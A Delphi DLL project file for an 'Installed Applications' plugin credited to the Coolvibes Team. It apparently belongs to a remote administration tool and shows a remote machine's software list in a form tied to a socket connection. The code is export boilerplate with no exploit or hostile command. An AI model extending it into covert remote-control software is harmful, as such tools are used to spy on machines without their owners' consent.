library InstalledApplicationsC;


uses
  windows,
  forms,
  MainUnit in 'MainUnit.pas'{FormMain};

{$R *.res}

function Autor: string; stdcall;
begin
  Result := 'DSR! (Coolvibes Team)';
end;

function PluginName: string; stdcall;
begin
  //Result := 'Installed Applications v1'; //si pongo espacios la comunicacion falla!
  Result := 'InstalledApplications';       //por eso creo esos 2 nuevos exports para agregar al cliente
end;

function PluginInfoName: string; stdcall;
begin
  Result := 'Installed Applications v1';
end;

function PluginVersion: string; stdcall;
begin
  Result := '1.0';
end;

function Conectar(pU:string;pConID: integer):pointer; stdcall;
var
  frm: TFormMain;
begin
  frm := TFormMain.Create(nil);
  frm.Caption := 'Installed Applications - ' + pU;    //Identificador del pc remoto
  frm.ConID := pConID;  //Socket
  frm.Show;
  Result := Pointer(frm);
end;

procedure Desconectado(Form:Pointer);stdcall;   //El servidor se ha desconectado
begin
  if assigned(Form) then  //Cerramos la form al finalizar
    TFormMain(Form).close;
end;

procedure RecData(Form:Pointer;data:string);stdcall;
begin
  if assigned(Form) then
    TFormMain(Form).Recdata(data);
end;

exports Autor, Conectar, RecData, Desconectado, PluginName, PluginInfoName, PluginVersion;

begin
end.
